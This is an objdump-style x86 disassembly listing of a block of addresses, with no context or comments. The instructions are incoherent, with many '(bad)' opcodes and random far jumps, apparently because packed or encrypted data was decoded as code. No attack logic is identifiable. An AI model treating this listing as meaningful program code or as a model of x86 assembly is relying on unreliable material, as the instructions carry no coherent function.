  403430:	jp     0x403480
  403432:	mov    edi,0xbbb67033
  403437:	xor    esp,DWORD PTR [eax+0x5c]
  40343a:	cwde   
  40343b:	pop    ss
  40343c:	retf   0x9b68
  40343f:	std    
  403440:	cmp    ah,BYTE PTR [ebx-0x9]
  403443:	sar    BYTE PTR [ebx-0x2b],0x6
  403447:	shl    BYTE PTR [edx+0x1afaf6d1],1
  40344d:	iret   
  40344e:	idiv   dl
  403450:	(bad)  
  403451:	push   DWORD PTR [edx+edx*1-0x41]
  403455:	ds pusha 
  403457:	push   0x3a
  403459:	xor    dl,BYTE PTR [ecx]
  40345b:	(bad)  
  40345e:	jmp    0xfb05f730
  403463:	mov    ebx,0xbbfac95a
  403468:	mov    ah,0x63
  40346a:	(bad)  
  40346b:	in     al,0x36
  40346d:	mov    WORD PTR [eax],fs
  40346f:	pop    es
  403470:	xchg   edi,eax
  403471:	add    al,0xa8
  403473:	mov    BYTE PTR [edi-0x1],0xbf
  403477:	mov    fs,eax
  403479:	push   cs
  40347a:	xchg   edx,eax
  40347b:	out    0xe0,al
  40347d:	push   cs
  40347e:	nop
  40347f:	nop
	...
  403494:	mov    ebp,0x2ce90afa
  403499:	retf   0x49ea
  40349c:	cmp    eax,0x3a08a9c1
  4034a1:	mov    edi,0xc86abe62
  4034a6:	or     bh,BYTE PTR [ebp-0x68933896]
  4034ac:	dec    esi
  4034ad:	inc    eax
  4034ae:	call   0x781b:0xb6fe7943
  4034b5:	mov    ebp,0x766906f0
  4034ba:	inc    ecx
  4034bb:	test   BYTE PTR [eax-0x7909cde2],0x74
  4034c2:	pop    ebp
  4034c3:	adc    cl,BYTE PTR [eax]
  4034c5:	es (bad) 
  4034c7:	jmp    0xc50d6707
  4034cc:	js     0x4034bf
  4034ce:	jmp    0xdb05e7a0
  4034d3:	mov    esp,0xbdbac81a
  4034d8:	mov    esp,0x7e6dde63
  4034dd:	mov    DWORD PTR [eax],eax
  4034df:	add    BYTE PTR [edi],dh
  4034e1:	loop   0x4034a3
  4034e3:	sub    cl,BYTE PTR [esi-0x3]
  4034e6:	fdiv   DWORD PTR [edx-0xe]
  4034e9:	or     eax,0xde70afb
  4034ee:	stc    
  4034ef:	fs mov cl,0xf9
  4034f2:	pop    esp
  4034f3:	stc    
  4034f4:	or     DWORD PTR [ebx+eax*1+0x2f],ebp
	...
  40350b:	add    BYTE PTR [ecx],dh
  40350d:	mov    edi,0xbd3de4c0
  403512:	mov    esi,DWORD PTR [edx-0x4fdc35fc]
  403518:	in     al,dx
  403519:	(bad)  
  40351a:	lea    edi,[ebp+0x50]
  40351d:	sub    eax,0xfd3f2514
  403522:	push   ebp
  403523:	sar    ebx,0xbe
  403526:	or     edx,ebp
  403528:	jmp    0xfb1d:0x8cbaf875
  40352f:	mov    edx,0xe68c7382
  403534:	mov    ebx,0x3c91a1da
  403539:	xor    bh,BYTE PTR [eax+ebp*1]
  40353c:	jp     0x403530
  40353e:	add    dh,BYTE PTR [ebx]
  403540:	mov    ah,0xc6
  403542:	xor    edx,DWORD PTR [eax-0x6c]
  403545:	leave  
  403546:	xor    edx,DWORD PTR [ebx-0x3a]
  403549:	fs pop ds
  40354b:	xor    esp,ecx
  40354d:	lods   eax,DWORD PTR ds:[esi]
  40354e:	out    0xea,eax
  403550:	sbb    al,dh
  403552:	shr    BYTE PTR [edx],0x21
  403555:	std    
  403556:	fsub   DWORD PTR [edx-0x4e]
  403559:	or     eax,0xdaccafb
  40355e:	stc    
  40355f:	ins    BYTE PTR es:[edi],dx
  403560:	mov    cl,0xf9
  403562:	in     eax,0x24
  403564:	call   0xc0c0:0x5ea7031f
  40356b:	add    BYTE PTR [ebp-0x4],bl
  40356e:	ret    0x8b
	...
  403581:	add    BYTE PTR [eax],al
  403583:	add    BYTE PTR [ebx],bh
  403585:	retf   
  403586:	mul    DWORD PTR [ebx]
  403588:	dec    ecx
  403589:	int3   
  40358a:	cli    
  40358b:	lea    ecx,[edi+eiz*8-0x44b0f82b]
  403592:	add    edx,DWORD PTR [esi+0x58]
  403595:	mov    ebp,0xad1309c2
  40359a:	mov    edi,eax
  40359c:	xor    eax,DWORD PTR [edx-0x7aec04dd]
  4035a2:	lea    ecx,[edi+edx*1-0x432af288]
  4035a9:	sti    
  4035aa:	dec    ebp
  4035ab:	or     al,0xa1
  4035ad:	mov    ebp,0x73aa030e
  4035b2:	cli    
  4035b3:	xor    ebx,DWORD PTR [ecx-0x35cc0825]
  4035b9:	jno    0x403557
  4035bb:	pop    ds
  4035bc:	push   ebp
  4035bd:	jmp    0x5f237b1b
  4035c2:	and    cl,al
  4035c4:	xchg   ebx,eax
  4035c5:	call   0x869c0ecc
  4035ca:	xor    edi,ebx
  4035cc:	add    DWORD PTR [edx+0x7925f933],0x7
  4035d3:	add    eax,0x3a99c09
  4035d8:	into   
  4035d9:	enter  0xc0c0,0x9d
  4035dd:	sti    
  4035de:	ret    0xfb8b
  4035e1:	retf   
  4035e2:	mul    DWORD PTR [ebx]
  4035e4:	stc    
  4035e5:	retf   
  4035e6:	cli    
  4035e7:	lea    eax,[eax]
	...
  4035f9:	add    BYTE PTR [eax],al
  4035fb:	add    ah,bl
  4035fd:	out    0xf7,eax
  4035ff:	mov    ds:0x56038137,eax
  403604:	push   0x5309c2bd
  403609:	lods   al,BYTE PTR ds:[esi]
  40360a:	mov    edi,eax
  40360c:	cmp    DWORD PTR [esi-0x5aaddc43],esp
  403612:	mov    ebx,0xdac9bd8d
  403617:	add    dl,dh
  403619:	jns    0x40361f
  40361b:	dec    esi
  40361c:	sbb    eax,0x3a0ec218
  403621:	jecxz  0x4035ae
  403623:	cli    
  403624:	push   0xffffffa0
  403626:	jecxz  0x40361f
  403628:	push   0xffffffa3
  40362a:	xchg   ecx,eax
  40362b:	pushf  
  40362c:	and    edx,DWORD PTR ds:[eax+0x2a]
  403630:	les    ebp,FWORD PTR [edx+0x6af8305d]
  403636:	sbb    BYTE PTR [ebx],al
  403638:	loopne 0x40366c
  40363a:	mov    ebp,0xbabb0333
  40363f:	lea    edi,[ebp-0xcc6be5a]
  403645:	add    ax,WORD PTR [esi+0x4d]
  403649:	push   0x6a3a04c4
  40364e:	mov    edi,ebx
  403650:	or     dl,BYTE PTR [eax+0x5dbcf7f3]
  403656:	pop    ss
  403657:	or     edi,0x670386b8
  40365d:	leave  
  40365e:	(bad)
	...
  403672:	add    BYTE PTR [eax],al
  403674:	inc    edx
  403675:	stos   BYTE PTR es:[edi],al
  403676:	ror    DWORD PTR [ebx+0x33bb1ab1],cl
  40367c:	mov    ds:0x5b0f902c,eax
  403681:	enter  0x6da0,0x3a
  403685:	lahf   
  403686:	out    dx,eax
  403687:	sar    BYTE PTR [eax-0x27],0x2
  40368b:	retf   0x43b2
  40368e:	repz test DWORD PTR [edx-0x10],0xdd569c90
  403696:	sti    
  403697:	in     al,0x6c
  403699:	add    dl,ch
  40369b:	pop    ebp
  40369c:	and    ecx,eax
  40369e:	sub    dl,BYTE PTR [edi]
  4036a0:	cmp    bl,cl
  4036a2:	bound  edi,QWORD PTR [ebp-0x452545f6]
  4036a8:	mov    esp,0x5347ee84
  4036ad:	jle    0x4036f4
  4036af:	add    esi,edi
  4036b1:	add    ebp,DWORD PTR [eax]
  4036b3:	les    edi,FWORD PTR ds:0x328b2a03
  4036b9:	repz fcomip st,st(2)
  4036bc:	lea    esi,cs:[ebp+0x16]
  4036c0:	ror    dh,1
  4036c2:	mov    bh,0x4a
  4036c4:	cmp    dl,BYTE PTR [esi-0x7]
  4036c7:	(bad)  
  4036c8:	sti    
  4036c9:	or     ch,dl
  4036cb:	shl    DWORD PTR [edx+0x4abafab7],cl
  4036d1:	mov    edx,0x20468f64
  4036d6:	and    bh,BYTE PTR [ebx+0x0]
	...
  4036e9:	add    BYTE PTR [eax],al
  4036eb:	add    bh,ah
  4036ed:	add    dh,BYTE PTR [edi]
  4036ef:	and    al,bh
  4036f1:	sar    cl,0x2
  4036f4:	repz mov dl,BYTE PTR [ebx-0x700d310e]
  4036fb:	nop
  4036fc:	lods   eax,DWORD PTR ds:[esi]
  4036fd:	push   ds
  4036fe:	stc    
  4036ff:	jg     0x403687
  403701:	jge    0x4036ed
  403703:	pop    ebp
  403704:	adc    ecx,eax
  403706:	stos   BYTE PTR es:[edi],al
  403707:	push   ss
  403708:	cmp    bl,cl
  40370a:	bound  edi,QWORD PTR [edx+ebp*2-0x4b44e546]
  403711:	and    esi,0xffffffc5
  403714:	pop    ds
  403715:	fwait
  403716:	add    DWORD PTR [ebx],eax
  403718:	push   ebx
  40371a:	daa    
  40371b:	ret    
  40371c:	xor    eax,0x828a2a03
  403721:	repnz aas 
  403723:	xacquire xchg BYTE PTR [eax+eax*1+0x27ba4f5d],cl
  40372b:	mov    BYTE PTR [eax+0x78281602],ah
  403731:	or     al,BYTE PTR [ebx]
  403733:	cmp    DWORD PTR [ebx+0x4b1233b7],esi
  403739:	mov    eax,0x853f5d8d
  40373e:	xor    BYTE PTR [esi],dl
  403740:	outs   dx,BYTE PTR ds:[esi]
  403741:	add    cl,BYTE PTR [esi-0x13]
  403744:	jne    0x403706
  403746:	adc    dl,ch
  403748:	add    BYTE PTR [edx-0xe0d4506],cl
  40374e:	clc    
  40374f:	je     0x403751
	...
  403761:	add    BYTE PTR [eax],al
  403763:	add    cl,bl
  403765:	sbb    eax,0x4b2fc05
  40376a:	add    esi,DWORD PTR [edi]
  40376c:	xor    eax,0x39f6c3bf
  403771:	xlat   BYTE PTR ds:[ebx]
  403772:	mov    eax,eax
  403774:	or     BYTE PTR [eax-0x7b513dcd],bh
  40377a:	pop    es
  40377b:	lock or dl,ch
  40377e:	fldl2e 
  403780:	je     0x403766
  403782:	shr    BYTE PTR [ecx+0x72c30131],0xa0
  403789:	icebp  
  40378a:	clc    
  40378b:	ficom  DWORD PTR [edx-0x68096b75]
  403791:	xchg   edi,eax
  403792:	fisttp DWORD PTR [edi-0x57cfa9c8]
  403798:	sti    
  403799:	or     DWORD PTR [ebx],eax
  40379b:	cdq    
  40379c:	sar    BYTE PTR [eax-0x48578dcd],0x8d
  4037a3:	jne    0x4037d9
  4037a5:	mov    eax,0x13c8b7c
  4037aa:	dec    esi
  4037ab:	adc    eax,0xea10bf7a
  4037b0:	or     BYTE PTR [ecx+0x798300fa],0x33
  4037b7:	stc    
  4037b8:	or     eax,0xd6651f60
  4037bd:	sub    eax,0x9be03c4
  4037c2:	rol    ebx,0x67
  4037c5:	add    cl,bl
  4037c7:	mov    edi,0x0
	...
  4037dc:	aas    
  4037dd:	jnp    0x4037de
  4037df:	push   DWORD PTR [ebx+0x77]
  4037e2:	or     edi,ebx
  4037e4:	jae    0x403860
  4037e6:	lea    eax,[edi+edx*2+0x44292245]
  4037ed:	add    BYTE PTR [esi],al
  4037ef:	shl    DWORD PTR [eax+0x6],0x3
  4037f3:	ret    
  4037f4:	pop    edi
  4037f5:	jnp    0x4037f6
  4037f7:	call   FWORD PTR [edi]
  4037f9:	mov    al,0xf8
  4037fb:	or     ebx,DWORD PTR [eax]
  4037fd:	mov    al,0xfa
  4037ff:	lea    edx,[esp+edx*1+0x3f3aff97]
  403806:	add    edx,DWORD PTR [esi+0x1c]
  403809:	ret    0xac2
  40380c:	adc    edx,ecx
  40380e:	mov    edi,0xff7bafff
  403813:	xor    ebp,DWORD PTR [ebx-0x67cc05f9]
  403819:	lea    ecx,[edi+ecx*1-0x546c5f89]
  403820:	jecxz  0x40386c
  403822:	cmp    cl,al
  403824:	mov    eax,ds:0x7fca030b
  403829:	jl     0x40382a
  40382b:	(bad)  
  40382c:	aas    
  40382d:	mov    al,0xf7
  40382f:	or     ebp,DWORD PTR [ecx]
  403831:	mov    al,0xf9
  403833:	(bad)  
  403834:	cld    
  403835:	sbb    edi,DWORD PTR [ecx]
  403837:	mov    al,ds:0x5e037d23
  40383c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40383d:	rol    ebx,0x15
	...
  403854:	cmp    DWORD PTR [edx+0x4d8ebfda],ebp
  40385a:	mov    esp,0x8414aff
  40385f:	sti    
  403860:	dec    edx
  403861:	inc    eax
  403862:	mov    es,WORD PTR [esi+edi*1-0x2ba4a616]
  403869:	test   eax,0xe6783045
  40386e:	add    al,0x3
  403870:	jp     0x4038cf
  403872:	mov    esp,0xf01556ff
  403877:	clc    
  403878:	inc    edx
  403879:	(bad)  
  40387b:	cli    
  40387c:	mov    ah,0x5a
  40387e:	adc    al,0x92
  403880:	ins    DWORD PTR es:[edi],dx
  403881:	stos   BYTE PTR es:[edi],al
  403882:	mov    WORD PTR [ebx],es
  403884:	(bad)  
  403885:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403886:	ret    0x43c2
  403889:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40388a:	sar    DWORD PTR [edi-0x445cda],cl
  403890:	push   0xffffff9e
  403892:	psubd  mm1,QWORD PTR [edx-0x2f]
  403896:	mov    DWORD PTR [esi+edi*1+0x6efb04c],ecx
  40389d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40389e:	dec    ecx
  40389f:	sub    al,bh
  4038a1:	push   0x3303030b
  4038a6:	mov    ebx,0xf76aeeff
  4038ab:	div    DWORD PTR [edx]
  4038ad:	pusha  
  4038ae:	idiv   ecx
  4038b0:	lods   al,BYTE PTR ds:[esi]
  4038b1:	cmp    eax,0x2d74d11b
  4038b6:	add    DWORD PTR [ebx],0x0
	...
  4038cc:	outs   dx,DWORD PTR ds:[esi]
  4038cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4038ce:	(bad)
  4038d2:	fdivr  QWORD PTR [edi-0x44c542]
  4038d8:	push   0x2f
  4038da:	psubq  mm5,QWORD PTR [edx+0x30]
  4038de:	mov    DWORD PTR [esi+edi*1-0x2ec64a00],eax
  4038e5:	sub    ebp,edx
  4038e7:	inc    ecx
  4038e8:	pop    ecx
  4038e9:	shr    DWORD PTR [ecx],0x2
  4038ec:	cmp    bh,BYTE PTR [edi-0x44794472]
  4038f2:	inc    esi
  4038f3:	test   DWORD PTR [ecx+0x73f74107],0x59135d8d
  4038fd:	mov    ds:0x523ab9fd,al
  403902:	in     eax,0xc4
  403904:	jnp    0x40390c
  403906:	jmp    0x4ebb:0x16bb96d3
  40390d:	out    dx,eax
  40390e:	adc    DWORD PTR [edi],ecx
  403910:	inc    ebx
  403911:	out    dx,eax
  403912:	add    BYTE PTR [ecx+0x46d50bad],cl
  403918:	cmp    BYTE PTR [edi-0x16],bl
  40391b:	dec    ecx
  40391c:	push   ecx
  40391d:	shr    DWORD PTR [eax],0xb
  403920:	cmp    al,dh
  403922:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403923:	mov    edx,0xf6debb1e
  403928:	push   cs
  403929:	pop    es
  40392a:	shl    dh,1
  40392c:	adc    BYTE PTR [ebp+0x1a6d],cl
	...
  403942:	add    BYTE PTR [eax],al
  403944:	fcom   DWORD PTR [eax]
  403946:	icebp  
  403947:	dec    ecx
  403948:	cmp    bl,BYTE PTR [edx-0xb]
  40394b:	(bad)  
  40394c:	cli    
  40394d:	adc    al,0xea
  40394f:	fsubr  QWORD PTR [esi-0x19455146]
  403955:	out    dx,al
  403956:	mov    ds:0x9feee20e,al
  40395b:	mov    BYTE PTR [ebp+0x6a396b02],bh
  403961:	mov    bl,0xea
  403963:	inc    ecx
  403964:	sub    ecx,eax
  403966:	test   eax,0x3ebf3a01
  40396b:	mov    edx,0x7600bab6
  403970:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403971:	mov    bh,0xb
  403973:	jno    0x403924
  403975:	mov    ch,0x8d
  403977:	jge    0x4039c4
  403979:	cmc    
  40397a:	icebp  
  40397b:	and    edx,DWORD PTR [eax]
  40397d:	call   DWORD PTR [ebp+0x5]
  403980:	je     0x40393f
  403982:	or     ch,dl
  403984:	push   0x7a
  403986:	inc    DWORD PTR [esi-0x3d]
  403989:	mov    edx,0xb6474233
  40398e:	xor    esi,DWORD PTR [ecx]
  403990:	ror    DWORD PTR [ebx-0x2d738df1],0x2a
  403997:	jmp    0xff43:0x28c107f0
  40399e:	leave  
  40399f:	push   esi
  4039a0:	xchg   ebx,eax
  4039a1:	mov    edx,0xb24f0eff
  4039a6:	or     eax,DWORD PTR [eax]
	...
  4039bc:	inc    edi
  4039bd:	mov    eax,0x8f535d8d
  4039c2:	shr    DWORD PTR [edi-0x21],cl
  4039c5:	std    
  4039c6:	pop    ebp
  4039c7:	(bad)  
  4039ca:	adc    eax,0x7d8603ea
  4039cf:	icebp  
  4039d0:	cmp    eax,DWORD PTR [ecx]
  4039d2:	add    DWORD PTR [esi],esi
  4039d4:	cmp    edi,edi
  4039d6:	dec    esi
  4039d7:	loope  0x403a14
  4039d9:	push   ecx
  4039da:	or     al,0xc6
  4039dc:	jbe    0x40399a
  4039de:	lea    esi,[edi]
  4039e0:	jge    0x4039eb
  4039e2:	mov    esi,esp
  4039e4:	lods   al,BYTE PTR ds:[esi]
  4039e5:	mov    ecx,0x558213ff
  4039ea:	pop    eax
  4039eb:	inc    esi
  4039ec:	add    edi,0xffffffc2
  4039ef:	in     eax,dx
  4039f0:	cmp    dl,BYTE PTR [ebx-0x75]
  4039f3:	test   DWORD PTR [esp+eax*8+0x4d6b36f8],esi
  4039fa:	mov    DWORD PTR [eax],0x780d
  403a00:	mov    al,ds:0x9475fefd
  403a05:	mov    BYTE PTR [ebp-0x8],al
  403a08:	fistp  QWORD PTR [ecx-0x22e9a91]
  403a0e:	add    BYTE PTR [ebx],ah
  403a10:	fucom  st(0)
  403a12:	mov    BYTE PTR ds:0x411a6c,0x19
  403a19:	sub    ecx,ebp
  403a1b:	out    dx,eax
  403a1c:	dec    edi
  403a1d:	mov    ecx,0x6577
	...
  403a32:	add    BYTE PTR [eax],al
  403a34:	mov    eax,ds:0xeadcfdfd
  403a39:	fwait
  403a3a:	mov    DWORD PTR ds:0x411a94,0x103249be
  403a44:	pop    ds
  403a45:	mov    ecx,0xfda1657f
  403a4a:	out    dx,eax
  403a4b:	loope  0x403a4f
  403a4d:	ret    
  403a4e:	jmp    0x403a6c
  403a50:	retf   
  403a51:	clc    
  403a52:	pop    es
  403a53:	add    ebx,ebp
  403a55:	jo     0x403ac1
  403a57:	inc    eax
  403a58:	mov    eax,0x10416538
  403a5d:	dec    ebp
  403a5e:	call   0xffb843c6
  403a63:	sbb    DWORD PTR [ebp+0x78],0x40
  403a67:	call   0x403740
  403a6c:	xchg   ebx,eax
  403a6d:	loop   0x403a66
  403a6f:	inc    eax
  403a70:	inc    ebx
  403a71:	(bad)  
  403a72:	mov    ebx,DWORD PTR [ebp-0x8]
  403a75:	add    ebx,0x40
  403a78:	pop    ebx
  403a79:	cli    
  403a7a:	pop    es
  403a7b:	add    ebx,DWORD PTR ds:0x4c685378
  403a81:	sbb    al,BYTE PTR [ecx+0x0]
  403a84:	adc    BYTE PTR [esp+edi*1-0x17],ch
  403a88:	cmp    DWORD PTR [edx-0x749bfe48],edx
  403a8e:	rol    DWORD PTR [ebx+0x430bb5],0xb9
  403a95:	and    eax,0x37ac
	...
  403aaa:	add    BYTE PTR [eax],al
  403aac:	daa    
  403aad:	into   
  403aae:	test   bl,ch
  403ab0:	xor    DWORD PTR [ebx-0x15257ff3],esi
  403ab6:	sbb    eax,0x44a73941
  403abb:	js     0x403a44
  403abd:	mov    WORD PTR ds:[eax],es
  403ac0:	cmp    DWORD PTR [edi+0x417ec87c],esp
  403ac6:	mov    eax,0xd733beb
  403acb:	sbb    BYTE PTR [edx+0x39411e32],0xa7
  403ad2:	inc    esp
  403ad3:	js     0x403b3c
  403ad5:	sub    eax,0xae900c3e
  403ada:	add    eax,DWORD PTR [eax]
  403adc:	cmp    esi,edx
  403ade:	aad    0xf7
  403ae0:	pop    eax
  403ae1:	fxch   st(3)
  403ae3:	(bad)  
  403ae5:	inc    ebp
  403ae6:	ret    
  403ae7:	gs js  0x403a93
  403aea:	mov    dl,BYTE PTR ds:0x4284ed
  403af0:	adc    DWORD PTR [edx-0x77c6fffd],edx
  403af6:	xor    al,0x65
  403af8:	js     0x403aa3
  403afa:	mov    dl,BYTE PTR ds:0x454485
  403b00:	mov    dl,0xd4
  403b02:	cmp    esp,DWORD PTR [ebp+0x78]
  403b05:	test   eax,0x7346c806
  403b0a:	pop    es
  403b0b:	leave  
  403b0c:	call   0x0:0x4120f9
	...
  403b23:	add    BYTE PTR [ecx],bh
  403b25:	and    BYTE PTR [ecx],dl
  403b27:	je     0x403b7d
  403b29:	add    BYTE PTR [eax],ch
  403b2b:	add    al,0xc0
  403b2d:	add    eax,0x782121
  403b32:	dec    eax
  403b33:	cmp    BYTE PTR [ecx+eax*2-0x17],bl
  403b37:	mov    ah,BYTE PTR [eax+eax*4]
  403b3a:	or     al,0x45
  403b3c:	cmp    DWORD PTR [edi],eax
  403b3e:	mov    cl,0x7
  403b40:	and    DWORD PTR [ebx-0xb],0x20
  403b44:	clc    
  403b45:	call   FWORD PTR [edi+0x11]
  403b48:	mov    ecx,0x2303a81d
  403b4d:	or     al,0x5e
  403b4f:	xor    DWORD PTR [ecx],ebp
  403b51:	sub    cl,bl
  403b53:	and    al,bh
  403b55:	inc    DWORD PTR [eax-0x6f]
  403b58:	xchg   ecx,eax
  403b59:	mov    bh,0x46
  403b5b:	pop    ebx
  403b5c:	pop    ss
  403b5d:	push   edi
  403b5e:	xor    dl,al
  403b60:	cmp    eax,0x558a9c00
  403b65:	and    DWORD PTR ds:0x26b8a0bc,0xffffffb7
  403b6c:	push   esi
  403b6d:	mov    esp,ebp
  403b6f:	enter  0x1d75,0xa8
  403b73:	add    esi,DWORD PTR [edx-0x2b33e3f4]
  403b79:	inc    eax
  403b7a:	jmp    0x33473c85
  403b7f:	lea    esi,ds:0x78212dc5
  403b85:	add    BYTE PTR [eax+0x10],ah
	...
  403b9c:	in     al,dx
  403b9d:	(bad)  
  403b9e:	dec    esp
  403b9f:	inc    ebp
  403ba0:	cmp    DWORD PTR [ecx+0x54],eax
  403ba3:	fnop   
  403ba5:	mov    edi,0x8b06b6d6
  403baa:	in     eax,0x88
  403bac:	rcr    DWORD PTR ds:0xbc20428,0x6c
  403bb3:	pop    edi
  403bb4:	push   edi
  403bb5:	inc    ecx
  403bb6:	add    cl,ch
  403bb8:	jmp    0x403bbc
  403bba:	lea    ebx,[ebp+0x3c]
  403bbd:	inc    ecx
  403bbe:	add    dl,bl
  403bc0:	inc    esi
  403bc1:	test   DWORD PTR [edi+eax*1-0x54ccff8c],eax
  403bc8:	in     eax,dx
  403bc9:	mov    edi,0xbbb1e589
  403bce:	data16 sub BYTE PTR ds:0xc3977541,bh
  403bd5:	adc    al,0x70
  403bd7:	or     al,0xfc
  403bd9:	dec    DWORD PTR [edx+0x411d4eb4]
  403bdf:	jmp    0xc4b830a7
  403be4:	cmc    
  403be5:	(bad)  
  403be6:	(bad)  
  403be7:	sbb    al,0x41
  403be9:	sbb    eax,0x3cb7e941
  403bee:	cld    
  403bef:	inc    esi
  403bf0:	imul   esi,DWORD PTR [esi],0x873aa865
  403bf6:	inc    ebp
  403bf7:	xor    ebp,esp
  403bf9:	mov    ds:0x8aa72eff,eax
  403bfe:	(bad)  
  403bff:	jb     0x403c01
	...
  403c11:	add    BYTE PTR [eax],al
  403c13:	add    BYTE PTR [edi-0x73352d52],dl
  403c19:	loop   0x403c6f
  403c1b:	adc    eax,0xe503c233
  403c20:	mov    cl,0xcb
  403c22:	gs test al,0x3a
  403c25:	add    DWORD PTR [ebp+0x1],eax
  403c28:	cmp    DWORD PTR [edi-0x4a7f9487],edx
  403c2e:	jne    0x403c1d
  403c30:	mov    ah,0x3b
  403c32:	clc    
  403c33:	jo     0x403c83
  403c35:	mov    ah,0xc1
  403c37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c38:	daa    
  403c39:	mov    esi,edi
  403c3b:	(bad)  
  403c3c:	enter  0xc3bf,0xe4
  403c40:	cmp    eax,ebx
  403c42:	inc    ecx
  403c43:	add    BYTE PTR ds:0xafecb9c8,dh
  403c49:	imul   edi,edi,0xffffff8b
  403c4c:	xchg   esi,eax
  403c4d:	xchg   edi,edx
  403c4f:	xor    edx,DWORD PTR ds:0xe3c23378
  403c55:	mov    ch,0x8c
  403c57:	and    al,0x36
  403c59:	inc    ecx
  403c5a:	add    BYTE PTR [ebx],al
  403c5c:	adc    eax,0xbba10574
  403c61:	fldcw  WORD PTR [esi-0x1]
  403c64:	mov    ch,0x6d
  403c66:	pop    DWORD PTR [ebp-0x48]
  403c69:	mov    DWORD PTR [ebp-0x4],edi
  403c6c:	shl    DWORD PTR [esi+0x1e],1
  403c6f:	mov    ecx,DWORD PTR [esi]
  403c71:	xchg   ebx,esi
  403c73:	shl    DWORD PTR [ebx-0x4b],0x2
  403c77:	fadd   DWORD PTR [eax]
	...
  403c89:	add    BYTE PTR [eax],al
  403c8b:	add    cl,ah
  403c8d:	out    0xcf,al
  403c8f:	mov    ecx,0xffff6afc
  403c94:	sbb    esi,DWORD PTR [ebx-0x75]
  403c97:	push   ebp
  403c98:	cld    
  403c99:	push   es
  403c9a:	inc    ebp
  403c9b:	cld    
  403c9c:	inc    ebx
  403c9d:	ret    
  403c9e:	and    eax,esi
  403ca0:	pop    ebx
  403ca1:	mov    edi,0xeffd0403
  403ca6:	gs inc ecx
  403ca8:	pusha  
  403ca9:	add    BYTE PTR [ebp-0x8],al
  403cac:	push   ebp
  403cad:	int    0xbc
  403caf:	sbb    ebx,edi
  403cb1:	push   0x75
  403cb3:	cld    
  403cb4:	fcomip st,st(4)
  403cb6:	test   DWORD PTR [ecx-0x393e9343],0x8bfe880e
  403cc0:	and    eax,edx
  403cc2:	ret    
  403cc3:	add    eax,0x7541d913
  403cc8:	retf   
  403cc9:	cmp    esp,ebp
  403ccb:	(bad)  
  403ccc:	out    dx,eax
  403ccd:	imul   ecx,DWORD PTR [ebx-0x33ddc63a],0x33
  403cd4:	je     0x403c99
  403cd6:	lock sar DWORD PTR [edx],0xa3
  403cda:	xchg   ah,al
  403cdc:	push   edi
  403cdd:	call   0x6fbc3fe5
  403ce2:	(bad)  
  403ce3:	aad    0xf8
  403ce5:	dec    eax
  403ce6:	retf   0x4cff
  403ce9:	pop    ebx
  403cea:	test   BYTE PTR [ebp-0x2f],al
  403ced:	das    
  403cee:	ss cld 
	...
  403d04:	clc    
  403d05:	fs adc eax,0xb021bf8b
  403d0b:	sar    DWORD PTR [edx-0x5d],0x0
  403d0f:	fdivr  st,st(0)
  403d11:	stos   DWORD PTR es:[edi],eax
  403d12:	rol    DWORD PTR [ecx],cl
  403d14:	inc    esp
  403d15:	mov    bh,0x1e
  403d17:	inc    ecx
  403d18:	cmp    DWORD PTR [eax+0x681c73ee],ebp
  403d1e:	add    eax,DWORD PTR [ecx]
  403d20:	dec    esp
  403d21:	lahf   
  403d22:	push   ds
  403d23:	inc    ecx
  403d24:	cmp    DWORD PTR [edx],esp
  403d26:	ds cld 
  403d28:	cmp    BYTE PTR [edi+esi*1-0x7759079b],bl
  403d2f:	inc    ebp
  403d30:	jno    0x403cd9
  403d32:	(bad)  
  403d33:	jg     0x403d11
  403d35:	addr16 add ecx,ecx
  403d38:	jp     0x403cc5
  403d3a:	mov    ah,ch
  403d3c:	push   esi
  403d3d:	xchg   ebx,eax
  403d3e:	or     ebp,eax
  403d40:	enter  0x31f,0x0
  403d44:	mov    edx,0x1775b40e
  403d49:	push   es
  403d4a:	or     BYTE PTR cs:[ecx],ah
  403d4d:	nop
  403d4e:	jp     0x403d50
  403d50:	cmp    DWORD PTR [esi-0xec18a3d],ebp
  403d56:	mov    bl,0xff
  403d58:	push   ds
  403d59:	mov    ds:0xc213a7,eax
  403d5e:	sub    DWORD PTR [eax],eax
  403d60:	test   eax,0x3e39a907
  403d65:	js     0x403d3d
  403d67:	mov    bl,0x0
	...
  403d79:	add    BYTE PTR [eax],al
  403d7b:	add    dh,bh
  403d7d:	mov    bl,0xc2
  403d7f:	or     dl,al
  403d81:	add    BYTE PTR [edx+0x4],dh
  403d84:	add    BYTE PTR [edi-0x7873fc1b],bh
  403d8a:	lds    eax,FWORD PTR [edi-0x8e54f0b]
  403d90:	repz es out dx,eax
  403d93:	sbb    eax,0x9beb2638
  403d98:	add    edi,DWORD PTR [ecx-0x17]
  403d9b:	add    edi,DWORD PTR [edx+0x3b398eb8]
  403da1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403da2:	or     edi,DWORD PTR [edi-0x6f]
  403da5:	fld    DWORD PTR es:[eax-0x63e65004]
  403dac:	mov    cl,0x9a
  403dae:	outs   dx,BYTE PTR ds:[esi]
  403daf:	mov    bl,0x1f
  403db1:	mov    ebx,0x3bb3ac
  403db6:	jb     0x403df9
  403db8:	sub    DWORD PTR [edx+0x24],edi
  403dbb:	sub    dh,BYTE PTR [eax-0xb78a4bb]
  403dc1:	add    ebp,ecx
  403dc3:	aaa    
  403dc4:	xor    al,0x87
  403dc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403dc7:	call   DWORD PTR [ebx+0x13]
  403dca:	push   0x31
  403dcc:	sub    eax,0xbbfdb400
  403dd1:	xor    eax,0xfbc403f1
  403dd6:	adc    ecx,ebp
  403dd8:	push   ebx
  403dd9:	add    edx,DWORD PTR [esi]
  403ddb:	cmp    DWORD PTR [ecx],esi
  403ddd:	test   al,0x7d
  403ddf:	mov    dl,0x0
	...
  403df1:	add    BYTE PTR [eax],al
  403df3:	add    BYTE PTR [esi],dh
  403df5:	mov    bl,0x6a
  403df7:	lods   al,BYTE PTR ds:[esi]
  403df8:	cs sub eax,0x894d9eeb
